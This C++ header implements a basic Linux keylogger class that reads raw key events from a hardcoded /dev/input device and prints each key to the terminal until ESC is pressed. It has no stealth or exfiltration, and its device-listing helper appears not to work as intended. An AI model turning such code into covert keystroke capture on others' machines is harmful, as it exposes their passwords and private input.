#pragma once

#ifdef __linux__
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#endif
#include <iostream>
#include <cstring>
#include <filesystem>
#include <regex>

#include "../helper.h"

class Keylogger {
public: 
#ifdef __linux__
  /*
  * Hardcode to correct event device for now
  * TODO: Make this dynamic
  * get all inputs from /dev/input/event*
  * ask user to type keys
  * find the correct device based on the key presses
  */
  std::string get_kb_device() {
    std::string path = "/dev/input";
    std::regex pattern("event[0-9]+");
       try {
        for (const auto& entry : std::filesystem::directory_iterator(path)) {
            if (std::filesystem::is_regular_file(entry)) {
                std::string filename = entry.path().filename().string();
                if (std::regex_match(filename, pattern)) {
                    std::cout << entry.path() << std::endl;
                }
            }
        }
    } catch (const std::filesystem::filesystem_error& e) {
        std::cerr << "Filesystem error: " << e.what() << std::endl;
    }
    return "/dev/input/event3";
  }

  /*
  * Outputs key events to stdout
  */
  void log_event(std::string kb_device) {
    int fd = open(kb_device.c_str(), O_RDONLY);
    if (fd == -1) {
      std::cerr << "Error opening device: " << kb_device << "\n";
      return;
    }

    struct input_event ev;
    while (true) {
      read(fd, &ev, sizeof(ev));
      if (ev.type == EV_KEY && ev.value == 0) {
        std::cout << "Key pressed: " << helper::keycodes[ev.code] << "\n";
      }
      if (strcmp(helper::keycodes[ev.code], "ESC") == 0) {
        std::cout << "Exiting...\n";
        break;
      }
    }
    close(fd);
  }
#endif
};
